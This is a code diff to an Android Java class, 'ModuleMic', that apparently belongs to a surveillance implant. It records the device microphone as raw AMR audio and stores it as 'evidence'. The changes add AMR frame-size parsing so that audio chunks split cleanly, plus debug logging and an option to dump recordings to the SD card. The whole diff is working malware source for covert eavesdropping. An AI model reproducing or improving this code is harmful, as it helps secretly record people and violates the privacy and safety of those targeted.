@@ -50,6 +50,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 
+	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
 	/** The recorder. */
 	MediaRecorder recorder;
 
@@ -188,6 +189,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	int index = 0;
+	byte[] bias = null;
 
 	private synchronized void saveRecorderEvidence() {
 
@@ -195,26 +197,58 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			Check.requires(recorder != null, "saveRecorderEvidence recorder==null"); //$NON-NLS-1$
 		}
 
-		final byte[] chunk = getAvailable();
-
+		byte[] chunk = getAvailable();
+		byte[] data = null;
 		if (chunk != null && chunk.length > 0) {
-
 			if (Cfg.MICFILE) {
 				AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
 				index++;
-				file.write(chunk);				
+				file.write(chunk);
 			}
 
-			int offset = 0;
+			// data contiene il chunk senza l'header
 			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
-				offset = AMR_HEADER.length;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): remove header");
+				}
+				int offset = AMR_HEADER.length;
+				data = Utils.copy(chunk, offset, chunk.length - offset);
+			} else if (bias != null && bias.length > 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + Utils.byteArrayToHex(bias));
+				}
+				data = Utils.concat(bias, bias.length, chunk, chunk.length);
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): plain chunk, no bias");
+				}
+				data = chunk;
 			}
 
-			byte[] data;
-			if (offset == 0) {
-				data = chunk;
-			} else {
-				data = Utils.copy(chunk, offset, chunk.length - offset);
+			// capire quale parte del chunk e' spezzata.
+			/* Find the packet size */
+			int pos = 0;
+			int len = 0;
+			do {
+				len = amr_sizes[(data[pos] >> 3) & 0x0f];
+				pos += len + 1;
+				if (false && Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " len = " + len);
+				}
+			} while (pos < data.length);
+
+			// portion of microchunk to be saved for the next time
+			int biasLen = (len - (pos - data.length) + 1) % len;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveRecorderEvidence): biasLen = " + biasLen);
+			}
+
+			bias = Utils.copy(data, data.length - biasLen, biasLen);
+			if(bias.length > 0){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): removing bias from data");
+				}
+				data = Utils.copy(data, 0, data.length - biasLen);
 			}
 
 			if (data.length > 0) {
@@ -325,7 +359,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
 		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-		
+		// dalla versione API 10, supporta anche AMR_WB
+
 		/*
 		 * recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		 * recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
